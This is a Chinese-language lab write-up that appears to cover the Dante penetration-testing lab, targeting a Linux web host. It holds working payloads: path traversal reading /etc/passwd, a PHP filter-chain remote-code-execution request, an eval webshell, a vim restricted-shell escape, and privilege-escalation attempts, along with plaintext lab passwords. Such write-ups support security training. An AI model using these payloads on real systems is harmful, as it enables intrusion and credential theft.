<p>å¯ä»¥åœ¨å…¶ä¸­å‘ç°ä¸€ä¸ª monitor æ–‡ä»¶ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â””â”€<span class="nv">$ </span>file monitor
monitor: pcap capture file, microsecond ts <span class="o">(</span>little-endian<span class="o">)</span> - version 2.4 <span class="o">(</span>Ethernet, capture length 65535<span class="o">)</span>
</code></pre></div></div>
<p>monitor æ˜¯ä¸€ä¸ª pcap æ–‡ä»¶ï¼Œä½¿ç”¨ wireshark æ‰“å¼€ã€‚è¿‡æ»¤ http æŠ¥æ–‡å¯ä»¥å‘ç°æµé‡ä¸­å­˜åœ¨éƒ¨åˆ†è®¤è¯æ¶ˆæ¯ã€‚</p>
<ul>
  <li>admin/password6543</li>
  <li>admin/Password6543</li>
</ul>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231226023935.png" alt="20231226023935"></p>

<!-- ![Alt text](../../../../../assets/image-9.png) -->

<h1 id="linux-17216110">Linux: 172.16.1.10</h1>
<h2 id="80-ç«¯å£æ–‡ä»¶åŒ…å«å¯¼è‡´-rce">80 ç«¯å£æ–‡ä»¶åŒ…å«å¯¼è‡´ RCE</h2>
<p>http://172.16.1.10/nav.php?page=about.html</p>

<p>page å‚æ•°å­˜åœ¨ç›®å½•ç©¿è¶Šï¼Œå¯¼è‡´ä»»æ„æ–‡ä»¶è¯»å–ã€‚</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://172.16.1.10/nav.php?page<span class="o">=</span>../../../../../../../etc/passwd
</code></pre></div></div>
<p>ç»“æœå¦‚ä¸‹ï¼š</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
whoopsie:x:120:125::/nonexistent:/bin/false
colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:122:127::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:124:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:125:130:Gnome Display Manager:/var/lib/gdm3:/bin/false
frank:x:1000:1000:frank,,,:/home/frank:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
margaret:x:1001:1001::/home/margaret:/bin/lshell
mysql:x:126:133:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:127:65534::/run/sshd:/usr/sbin/nologin
omi:x:998:997::/home/omi:/bin/false
omsagent:x:997:998:OMS agent:/var/opt/microsoft/omsagent/run:/bin/bash
nxautomation:x:996:995:nxOMSAutomation:/home/nxautomation/run:/bin/bash
</code></pre></div></div>
<p>è¿™å°ä¸»æœºå­˜åœ¨ä¸¤ä¸ªå¯ä»¥ç™»é™†çš„ç”¨æˆ·ï¼š</p>
<ul>
  <li>frank</li>
  <li>margaret</li>
</ul>

<p>ç»“åˆ SMB åŒ¿åæšä¸¾çš„ä¿¡æ¯ï¼Œmargaret æ˜¯æ‹¥æœ‰ç®¡ç†å‘˜æƒé™çš„ã€‚å¹¶ä¸”è¯¥ä¸»æœºä¸­éƒ¨ç½²äº† wordpressã€‚</p>

<p>ä½†è®¿é—® /wordpress è®¿é—®ä¸åˆ° wordpress æœåŠ¡ï¼Œæ‰«æç›®å½•ä¹Ÿæ²¡æœ‰æœ‰ç”¨çš„ç»“æœã€‚</p>

<p>ç›´æ¥è¯»å– margaret ç›®å½•ä¸‹çš„ flagã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://172.16.1.10/nav.php?page<span class="o">=</span>../../../../../../../../../home/margaret/flag.txt
</code></pre></div></div>
<p>è®¿é—® <code class="language-plaintext highlighter-rouge">/nav.php?page=../../../../../../../../../var/www/html/wordpress/index.php</code> æ—¶å¾—åˆ°äº†ä¸€ä¸ª 500 å“åº”ã€‚å¦‚æœæ²¡æœ‰æ–‡ä»¶ä¸å­˜åœ¨çš„è¯åº”è¯¥æ˜¯ 200ï¼Œè¯´æ˜å­˜åœ¨è¯¥æ–‡ä»¶ï¼Œä½†ç”±äº php æ–‡ä»¶åŒ…å«å¯¼è‡´æœåŠ¡å‡ºé”™ã€‚</p>

<p>php æ–‡ä»¶åŒ…å«å¯ä»¥é€šè¿‡ filter è¯»å–æºç ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">page</span><span class="o">=</span>php://filter/convert.base64-encode/resource<span class="o">=</span>../../../../../../../../../var/www/html/wordpress/index.php
</code></pre></div></div>
<p>ä¹Ÿå¯ä»¥åˆ©ç”¨ filter chain æ¥ RCEã€‚</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/nav.php?page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">172.16.1.10</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">4</span>

0=ls
</code></pre></div></div>
<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20240102074816.png" alt="20240102074816"></p>

<!-- ![Alt text](../../../../../assets/image-6.png) -->

<p>å†™å…¥ä¸€ä¸ª webshellã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">0</span><span class="o">=</span><span class="nb">echo</span>+<span class="s1">'&lt;?php+eval($_POST["pass"]);'</span>+&gt;e.php
</code></pre></div></div>
<p>æ‹¿åˆ° webshell ååœ¨ wp-config.php ä¸­è·å–åˆ°ç”¨æˆ· margaret çš„å¯†ç </p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_NAME'</span> <span class="s1">'wordpress'</span> <span class="p">);</span>

<span class="cd">/** MySQL database username */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_USER'</span><span class="p">,</span> <span class="s1">'margaret'</span> <span class="p">);</span>

<span class="cd">/** MySQL database password */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_PASSWORD'</span><span class="p">,</span> <span class="s1">'Welcome1!2@3#'</span> <span class="p">);</span>

<span class="cd">/** MySQL hostname */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_HOST'</span><span class="p">,</span> <span class="s1">'localhost'</span> <span class="p">);</span>
</code></pre></div></div>
<p>ä½†æ¯”è¾ƒå¥‡æ€ªçš„æ˜¯è¿æ¥æ•°æ®åº“æ—¶è¿”å› Access Denyã€‚</p>

<p>ä½¿ç”¨ ssh è¿›è¡Œè¿æ¥æ—¶å‘ç°è¯¥ç”¨æˆ·ä¸å…è®¸è¿œç¨‹ç™»é™†ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@DANTE-WEB-NIX01:/tmp# ssh margaret@172.16.1.10
/etc/ssh/ssh_config: line 53: Bad configuration option: denyusers
/etc/ssh/ssh_config: line 54: Bad configuration option: permitrootlogin
/etc/ssh/ssh_config: terminating, 2 bad configuration options
</code></pre></div></div>

<h2 id="ææƒåˆ°-margaret-bash-é€ƒé€¸">ææƒåˆ° margaret: bash é€ƒé€¸</h2>
<p>åå¼¹ shell åå¯ä»¥ su åˆ‡æ¢åˆ° margaret ç”¨æˆ·ï¼Œä½†å¾ˆå¤šå‘½ä»¤æ— æ³•ä½¿ç”¨ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>You are <span class="k">in </span>a limited shell.
Type <span class="s1">'?'</span> or <span class="s1">'help'</span> to get the list of allowed commands
</code></pre></div></div>
<p>åªèƒ½ä½¿ç”¨ä¸‹é¢çš„å‡ ä¸ªå‘½ä»¤ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>margaret:~<span class="nv">$ </span><span class="nb">help
cd  </span>clear  <span class="nb">exit  help  history  </span>lpath  lsudo  vim
</code></pre></div></div>
<p>æŸ¥è¯¢ gtfobinsï¼Œvim å¯ä»¥æ‰“å¼€ shellã€æ–‡ä»¶è¯»å–ã€æ–‡ä»¶ä¸‹è½½ç­‰ã€‚</p>

<p>ä½†ç›®æ ‡çš„é™åˆ¶å¾ˆå¤šï¼ŒåŒ…æ‹¬ shell çš„é™åˆ¶ï¼Œæ–‡ä»¶è·¯å¾„é™åˆ¶ç­‰ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">***</span> forbidden path: /root/flag.txt
</code></pre></div></div>
<p>ç›´æ¥æ‰§è¡Œ <code class="language-plaintext highlighter-rouge">vim -c ':set shell=/bin/sh|:shell'</code> ä¼šè¢«é™åˆ¶ã€‚ä½†å¦‚æœå…ˆè¿›å…¥ vimï¼Œç„¶åå†æ‰§è¡Œ <code class="language-plaintext highlighter-rouge">:set shell=/bin/sh|:shell</code> å³å¯ç»•è¿‡é™åˆ¶ã€‚</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls
1
channels.json
Desktop
Documents
Downloads
dpipe
flag.txt
flag.txt~
flag.txy~
flag.txz~
integration_logs.json
linpeas_fat.sh
linpeas.sh
Music
out1.txt
out2.txt
Pictures
project
Public
secure
snap
sudo
team
Templates
test
users.json
Videos
welcome
</code></pre></div></div>
<p>ç»•è¿‡ä¹‹åè¿˜æ˜¯æ— æ³•è¯»å– /root/flag.txt</p>

<h2 id="ææƒåˆ°-root-traitoræœªæˆåŠŸ">ææƒåˆ° root: traitorï¼ˆæœªæˆåŠŸï¼‰</h2>
<p>ä¸Šä¼  traitorï¼Œtraitor æ˜¯ä¸€ä¸ªé›†æˆäº† gtfobins å’Œ linux å¸¸è§ææƒæ¼æ´çš„æ‰«æå’Œåˆ©ç”¨å·¥å…·ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â–€â–ˆâ–€â€ƒâ–ˆâ–€â–ˆâ€ƒâ–„â–€â–ˆâ€ƒâ–ˆâ€ƒâ–€â–ˆâ–€â€ƒâ–ˆâ–€â–ˆâ€ƒâ–ˆâ–€â–ˆ                                     
â–‘â–ˆâ–‘â€ƒâ–ˆâ–€â–„â€ƒâ–ˆâ–€â–ˆâ€ƒâ–ˆâ€ƒâ–‘â–ˆâ–‘â€ƒâ–ˆâ–„â–ˆâ€ƒâ–ˆâ–€â–„ v0.0.14                                                                                            
https://github.com/liamg/traitor                                                                                             
                                                                                                                             
<span class="o">[</span>+] Assessing machine state...                                                                                               
<span class="o">[</span>+] Checking <span class="k">for </span>opportunities...
<span class="o">[</span>+][polkit:CVE-2021-3560] Polkit version is vulnerable!
<span class="o">[</span>+][polkit:CVE-2021-3560] System is vulnerable! Run again with <span class="s1">'--exploit polkit:CVE-2021-3560'</span> to exploit it.
<span class="o">[</span>+][kernel:CVE-2022-0847] Kernel version 5.15.0 is vulnerable!
<span class="o">[</span>+][kernel:CVE-2022-0847] System is vulnerable! Run again with <span class="s1">'--exploit kernel:CVE-2022-0847'</span> to exploit it.
</code></pre></div></div>
<p>å°è¯•äº† CVE-2021-3560 å’Œ CVE-2022-0847 å‡æ— æ³•æˆåŠŸã€‚</p>

<h2 id="ææƒåˆ°-frank-slack-æ¸—é€">ææƒåˆ° frank: Slack æ¸—é€</h2>
<p>æŸ¥çœ‹ è¿›ç¨‹åˆ—è¡¨å‘ç° frank ç”¨æˆ·ä½¿ç”¨äº† Slackã€‚åœ¨ /home/frank/Downloads/ ç›®å½•ä¸‹å‘ç°äº†å¯¼å‡ºæ–‡ä»¶ï¼šTest Workspace Slack export May 17 2020 - May 18 2020.zip</p>

<p>å°†å¯¼å‡ºæ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°ã€‚å…¶ä¸­ secure/2020-05-18.json ä¸­åŒ…å«äº†éƒ¨åˆ†èŠå¤©è®°å½•ã€‚æå–èŠå¤©å†…å®¹ï¼š</p>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">"text"</span><span class="p">:</span><span class="w"> </span><span class="s2">"&lt;@U013CT40QHM&gt; set the channel purpose: discuss network security"</span><span class="err">,</span><span class="w">
</span><span class="nl">"text"</span><span class="p">:</span><span class="w"> </span><span class="s2">"&lt;@U014025GL3W&gt; has joined the channel"</span><span class="err">,</span><span class="w">
</span><span class="nl">"text"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Hi Margaret, I created the channel so we can discuss the network security - in private!"</span><span class="err">,</span><span class="w">
</span><span class="nl">"text"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Hi Margaret,
"</span><span class="err">text</span><span class="s2">": "</span><span class="err">Great</span><span class="w"> </span><span class="err">idea,</span><span class="w"> </span><span class="err">Frank</span><span class="s2">",
"</span><span class="err">text</span><span class="s2">": "</span><span class="err">Great</span><span class="w"> </span><span class="err">idea,</span><span class="w">
</span><span class="nl">"text"</span><span class="p">:</span><span class="w"> </span><span class="s2">"We need to migrate the Slack workspace to the new Ubuntu images, can you do this today?"</span><span class="err">,</span><span class="w">
</span><span class="nl">"text"</span><span class="p">:</span><span class="w"> </span><span class="s2">"We need to migrate the Slack workspace to the new Ubuntu images,
"</span><span class="err">text</span><span class="s2">": "</span><span class="err">Sure,</span><span class="w"> </span><span class="err">but</span><span class="w"> </span><span class="err">I</span><span class="w"> </span><span class="err">need</span><span class="w"> </span><span class="err">my</span><span class="w"> </span><span class="err">password</span><span class="w"> </span><span class="err">for</span><span class="w"> </span><span class="err">the</span><span class="w"> </span><span class="err">Ubuntu</span><span class="w"> </span><span class="err">images,</span><span class="w"> </span><span class="err">I</span><span class="w"> </span><span class="err">haven't</span><span class="w"> </span><span class="err">been</span><span class="w"> </span><span class="err">given</span><span class="w"> </span><span class="err">it</span><span class="w"> </span><span class="err">yet</span><span class="s2">",
"</span><span class="err">text</span><span class="s2">": "</span><span class="err">Sure,</span><span class="w"> </span><span class="err">but</span><span class="w"> </span><span class="err">I</span><span class="w"> </span><span class="err">need</span><span class="w"> </span><span class="err">my</span><span class="w"> </span><span class="err">password</span><span class="w"> </span><span class="err">for</span><span class="w"> </span><span class="err">the</span><span class="w"> </span><span class="err">Ubuntu</span><span class="w"> </span><span class="err">images,</span><span class="w">
</span><span class="nl">"text"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Ahh sorry about that - its STARS5678FORTUNE401"</span><span class="err">,</span><span class="w">
</span><span class="nl">"text"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Thanks very much, I'll get on that now."</span><span class="err">,</span><span class="w">
</span><span class="nl">"text"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Thanks very much,
"</span><span class="err">text</span><span class="s2">": "</span><span class="err">No</span><span class="w"> </span><span class="err">problem</span><span class="w"> </span><span class="err">at</span><span class="w"> </span><span class="err">all.</span><span class="w"> </span><span class="err">I'll</span><span class="w"> </span><span class="err">make</span><span class="w"> </span><span class="err">this</span><span class="w"> </span><span class="err">channel</span><span class="w"> </span><span class="err">private</span><span class="w"> </span><span class="err">from</span><span class="w"> </span><span class="err">now</span><span class="w"> </span><span class="err">on</span><span class="w"> </span><span class="err">-</span><span class="w"> </span><span class="err">we</span><span class="w"> </span><span class="err">cant</span><span class="w"> </span><span class="err">risk</span><span class="w"> </span><span class="err">another</span><span class="w"> </span><span class="err">breach</span><span class="s2">",
"</span><span class="err">text</span><span class="s2">": "</span><span class="err">Please</span><span class="w"> </span><span class="err">get</span><span class="w"> </span><span class="err">rid</span><span class="w"> </span><span class="err">of</span><span class="w"> </span><span class="err">my</span><span class="w"> </span><span class="err">admin</span><span class="w"> </span><span class="err">privs</span><span class="w"> </span><span class="err">on</span><span class="w"> </span><span class="err">the</span><span class="w"> </span><span class="err">Ubuntu</span><span class="w"> </span><span class="err">box</span><span class="w"> </span><span class="err">and</span><span class="w"> </span><span class="err">go</span><span class="w"> </span><span class="err">ahead</span><span class="w"> </span><span class="err">and</span><span class="w"> </span><span class="err">make</span><span class="w"> </span><span class="err">yourself</span><span class="w"> </span><span class="err">an</span><span class="w"> </span><span class="err">admin</span><span class="w"> </span><span class="err">account</span><span class="s2">",
"</span><span class="err">text</span><span class="s2">": "</span><span class="err">Thanks,</span><span class="w"> </span><span class="err">will</span><span class="w"> </span><span class="err">do</span><span class="s2">",
"</span><span class="err">text</span><span class="s2">": "</span><span class="err">Thanks,</span><span class="w">
</span><span class="nl">"text"</span><span class="p">:</span><span class="w"> </span><span class="s2">"I also set you a new password on the Ubuntu box - 69F15HST1CX, same username"</span><span class="err">,</span><span class="w">
</span><span class="nl">"text"</span><span class="p">:</span><span class="w"> </span><span class="s2">"I also set you a new password on the Ubuntu box - 69F15HST1CX,
</span></code></pre></div></div>

<p>frank/69F15HST1CX</p>

<p>ä½†è¯¥å¯†ç æ— æ³•æ­£å¸¸ç™»é™†è‡³ frankã€‚Slack å¯¼å‡ºæ–‡ä»¶å¯èƒ½å¯¹èŠå¤©è®°å½•ä¸­çš„æ•æ„Ÿå†…å®¹è¿›è¡Œäº†ã€‚åŠ å¯†ï¼ŒåŸå§‹è®°å½•æ‰€åœ¨è·¯å¾„ä¸ºï¼š~/.config/Slack/exported_data/secure/2020-05-18.json</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"text"</span>: <span class="s2">"&lt;@U013CT40QHM&gt; set the channel purpose: discuss network security"</span>,
<span class="s2">"text"</span>: <span class="s2">"&lt;@U014025GL3W&gt; has joined the channel"</span>,
<span class="s2">"text"</span>: <span class="s2">"Hi Margaret, I created the channel so we can discuss the network security - in private!"</span>,
<span class="s2">"text"</span>: <span class="s2">"Hi Margaret,
"</span>text<span class="s2">": "</span>Great idea, Frank<span class="s2">",
"</span>text<span class="s2">": "</span>Great idea,
<span class="s2">"text"</span>: <span class="s2">"We need to migrate the Slack workspace to the new Ubuntu images, can you do this today?"</span>,
<span class="s2">"text"</span>: <span class="s2">"We need to migrate the Slack workspace to the new Ubuntu images,
"</span>text<span class="s2">": "</span>Sure, but I need my password <span class="k">for </span>the Ubuntu images, I haven<span class="s1">'t been given it yet",
"text": "Sure, but I need my password for the Ubuntu images,
"text": "Ahh sorry about that - its STARS5678FORTUNE401",
"text": "Thanks very much, I'</span>ll get on that now.<span class="s2">",
"</span>text<span class="s2">": "</span>Thanks very much,
<span class="s2">"text"</span>: <span class="s2">"No problem at all. I'll make this channel private from now on - we cant risk another breach"</span>,
<span class="s2">"text"</span>: <span class="s2">"Please get rid of my admin privs on the Ubuntu box and go ahead and make yourself an admin account"</span>,
<span class="s2">"text"</span>: <span class="s2">"Thanks, will do"</span>,
<span class="s2">"text"</span>: <span class="s2">"Thanks,
"</span>text<span class="s2">": "</span>I also <span class="nb">set </span>you a new password on the Ubuntu box - TractorHeadtorchDeskmat, same username<span class="s2">",
"</span>text<span class="s2">": "</span>I also <span class="nb">set </span>you a new password on the Ubuntu box - TractorHeadtorchDeskmat,
</code></pre></div></div>
<p>æ­£ç¡®å¯†ç åº”è¯¥æ˜¯ TractorHeadtorchDeskmatã€‚</p>

<h2 id="ææƒåˆ°-root-python-åŠ«æŒ">ææƒåˆ° root: python åŠ«æŒ</h2>
<p>æ³¨æ„åˆ° linPEAS ç»“æœä¸­çš„ä¸€ä¸ªæ¡ç›®ï¼š<code class="language-plaintext highlighter-rouge">Searching root files in home dirs</code>ï¼Œå…¶ä¸­åŒ…å«äº†æ–‡ä»¶ï¼š/home/frank/apache_restart.py</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">call</span>
<span class="kn">import</span> <span class="n">urllib</span>
<span class="n">url</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="nf">urlopen</span><span class="p">(</span><span class="n">localhost</span><span class="p">)</span>
<span class="n">page</span><span class="o">=</span> <span class="n">url</span><span class="p">.</span><span class="nf">getcode</span><span class="p">()</span>
<span class="k">if</span> <span class="n">page</span> <span class="o">==</span><span class="mi">200</span><span class="p">:</span>
        <span class="nf">print </span><span class="p">(</span><span class="sh">"</span><span class="s">We</span><span class="sh">'</span><span class="s">re all good!</span><span class="sh">"</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">We</span><span class="sh">'</span><span class="s">re failing!</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">call</span><span class="p">([</span><span class="sh">"</span><span class="s">systemctl start apache2</span><span class="sh">"</span><span class="p">],</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
</code></pre></div></div>
<p>å¯ä»¥çœ‹åˆ°è¯¥è„šæœ¬çš„å±ä¸»ä¸º rootï¼Œä¸”åŠŸèƒ½æ˜¯ç›‘æ§ apache2 çš„çŠ¶æ€å¹¶å®Œæˆ apache2 çš„å¯åŠ¨ã€‚ä½†è¯¥è„šæœ¬æ²¡æœ‰æ·»åŠ å¾ªç¯ï¼ŒçŒœæµ‹æ˜¯å¦ä½¿ç”¨äº†å®šæ—¶ä»»åŠ¡æˆ–è€…ä½¿ç”¨äº† while å¾ªç¯æ¥æ‰§è¡Œã€‚</p>

<p>ä½¿ç”¨ ps æŸ¥çœ‹è¿›ç¨‹ï¼Œå‘ç°è¯¥è„šæœ¬æ²¡æœ‰ç›´æ¥è¿è¡Œã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps aux | <span class="nb">grep </span>apache_restart
frank      23140  0.0  0.0   3312   720 ?        S    22:45   0:00 <span class="nb">grep </span>apache_restart
</code></pre></div></div>

<p>æŸ¥çœ‹å®šæ—¶ä»»åŠ¡ç›®å½•ï¼Œæœç´¢ apache_restart ä¹ŸåŒæ ·æ²¡æœ‰ç»“æœï¼Œè¯¥å®šæ—¶ä»»åŠ¡å¯èƒ½æ˜¯éšè—çš„ã€‚</p>
